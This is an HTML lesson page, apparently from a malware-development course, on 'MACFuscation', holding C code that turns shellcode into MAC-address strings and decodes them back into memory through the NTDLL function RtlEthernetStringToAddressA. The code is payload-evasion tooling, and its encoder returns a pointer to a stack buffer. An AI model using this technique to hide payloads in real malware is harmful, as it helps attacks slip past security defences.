@@ -1,0 +1,178 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Payload Obfuscation - MACFucscation</title><link rel="stylesheet" href="../../content.css"><script src="../../content.js" defer></script></head><body><main class="lesson">
+        <div id="payload-obfuscation-macfucscation" class="scroll-mt-24 pt-6 sm:pt-8 pb-3 border-b border-[#212b54] mt-8 sm:mt-12 mb-4 sm:mb-6 flex items-center justify-between group">
+            <h2 class="text-xl sm:text-2xl font-bold text-white tracking-tight flex items-center gap-2.5 sm:gap-3">
+                <i data-lucide="sparkles" class="w-4 h-4 sm:w-5 sm:h-5 text-[var(--accent)] flex-shrink-0"></i>
+                <span>Payload Obfuscation - MACFucscation</span>
+            </h2>
+            <a href="#payload-obfuscation-macfucscation" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition" class="opacity-0 group-hover:opacity-100 text-[#cbd5e1] hover:text-[var(--accent)] text-xs flex items-center gap-1 font-mono transition p-1.5 rounded hover:bg-[var(--accent-soft)]" title="Copy link">
+                <i data-lucide="link" class="w-4 h-4"></i>
+            </a>
+        </div><h3 id="introduction" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Introduction</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This module will go through another obfuscation technique that is similar to IPv4/IPv6fuscation but instead converts shellcode to MAC addresses.</p><h3 id="macfuscation-implementation" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>MACFuscation Implementation</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The implementation of MACFuscation will be similar to what was done in the previous module with IPv4/IPv6fuscation. A MAC address is made up of 6 bytes, therefore the shellcode should be a multiple of 6, which again can be padded if it doesn&#x27;t meet that requirement.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">// Function takes in 6 raw bytes and returns them in a MAC address string format
+char* GenerateMAC(int a, int b, int c, int d, int e, int f) {
+	char Output[64];
+
+	// Creating the MAC address and saving it to the &#x27;Output&#x27; variable
+	sprintf(Output, &quot;%0.2X-%0.2X-%0.2X-%0.2X-%0.2X-%0.2X&quot;,a, b, c, d, e, f);
+
+	// Optional: Print the &#x27;Output&#x27; variable to the console
+	// printf(&quot;[i] Output: %s\n&quot;, Output);
+
+	return (char*)Output;
+}
+
+// Generate the MAC output representation of the shellcode
+// Function requires a pointer or base address to the shellcode buffer &amp; the size of the shellcode buffer
+BOOL GenerateMacOutput(unsigned char* pShellcode, SIZE_T ShellcodeSize) {
+
+	// If the shellcode buffer is null or the size is not a multiple of 6, exit
+	if (pShellcode == NULL || ShellcodeSize == NULL || ShellcodeSize % 6 != 0){
+		return FALSE;
+	}
+	printf(&quot;char* MacArray [%d] = {\n\t&quot;, (int)(ShellcodeSize / 6));
+
+	// We will read one shellcode byte at a time, when the total is 6, begin generating the MAC address
+	// The variable &#x27;c&#x27; is used to store the number of bytes read. By default, starts at 6.
+	int c = 6, counter = 0;
+	char* Mac = NULL;
+
+	for (int i = 0; i &lt; ShellcodeSize; i++) {
+
+		// Track the number of bytes read and when they reach 6 we enter this if statement to begin generating the MAC address
+		if (c == 6) {
+			counter++;
+
+			// Generating the MAC address from 6 bytes which begin at i until [i + 5]
+			Mac = GenerateMAC(pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3], pShellcode[i + 4], pShellcode[i + 5]);
+
+			if (i == ShellcodeSize - 6) {
+
+				// Printing the last MAC address
+				printf(&quot;\&quot;%s\&quot;&quot;, Mac);
+				break;
+			}
+			else {
+				// Printing the MAC address
+				printf(&quot;\&quot;%s\&quot;, &quot;, Mac);
+			}
+			c = 1;
+
+			// Optional: To beautify the output on the console
+			if (counter % 6 == 0) {
+				printf(&quot;\n\t&quot;);
+			}
+		}
+		else {
+			c++;
+		}
+	}
+	printf(&quot;\n};\n\n&quot;);
+	return TRUE;
+}</code></pre>
+        </div><h3 id="deobfuscating-macfuscation-payloads" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Deobfuscating MACFuscation Payloads</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The deobfuscation process will reverse the obfuscation process, allowing a MAC address to generate bytes instead of using bytes to generate a MAC address. Performing deobfuscation will require the use of the NTDLL API function <a href="https://learn.microsoft.com/en-us/windows/win32/api/ip2string/nf-ip2string-rtlethernetstringtoaddressa" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">RtlEthernetStringToAddressA</a>. This function converts a MAC address from a string representation to its binary format.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">typedef NTSTATUS (NTAPI* fnRtlEthernetStringToAddressA)(
+	PCSTR		S,
+	PCSTR* 		Terminator,
+	PVOID		Addr
+);
+
+BOOL MacDeobfuscation(IN CHAR* MacArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {
+
+	PBYTE          pBuffer        = NULL,
+                   TmpBuffer      = NULL;
+
+	SIZE_T         sBuffSize      = NULL;
+
+	PCSTR          Terminator     = NULL;
+
+	NTSTATUS       STATUS         = NULL;
+
+	// Getting RtlIpv6StringToAddressA address from ntdll.dll
+	fnRtlEthernetStringToAddressA pRtlEthernetStringToAddressA = (fnRtlEthernetStringToAddressA)GetProcAddress(GetModuleHandle(TEXT(&quot;NTDLL&quot;)), &quot;RtlEthernetStringToAddressA&quot;);
+	if (pRtlEthernetStringToAddressA == NULL) {
+		printf(&quot;[!] GetProcAddress Failed With Error : %d \n&quot;, GetLastError());
+		return FALSE;
+	}
+
+	// Getting the real size of the shellcode which is the number of MAC addresses * 6
+	sBuffSize = NmbrOfElements * 6;
+
+
+	// Allocating memeory which will hold the deobfuscated shellcode
+	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
+	if (pBuffer == NULL) {
+		printf(&quot;[!] HeapAlloc Failed With Error : %d \n&quot;, GetLastError());
+		return FALSE;
+	}
+
+	TmpBuffer = pBuffer;
+
+	// Loop through all the MAC addresses saved in MacArray
+	for (int i = 0; i &lt; NmbrOfElements; i++) {
+
+		// Deobfuscating one MAC address at a time
+		// MacArray[i] is a single Mac address from the array MacArray
+		if ((STATUS = pRtlEthernetStringToAddressA(MacArray[i], &amp;Terminator, TmpBuffer)) != 0x0) {
+			// if it failed
+			printf(&quot;[!] RtlEthernetStringToAddressA Failed At [%s] With Error 0x%0.8X&quot;, MacArray[i], STATUS);
+			return FALSE;
+		}
+
+		// 6 bytes are written to TmpBuffer at a time
+		// Therefore Tmpbuffer will be incremented by 6 to store the
+		TmpBuffer = (PBYTE)(TmpBuffer + 6);
+
+	}
+
+	// Save the base address &amp; size of the deobfuscated payload
+	*ppDAddress  = pBuffer;
+	*pDSize      = sBuffSize;
+
+	return TRUE;
+
+}</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The image below shows the deobfuscation process successfully running.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/macfuscation.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div></main></body></html>
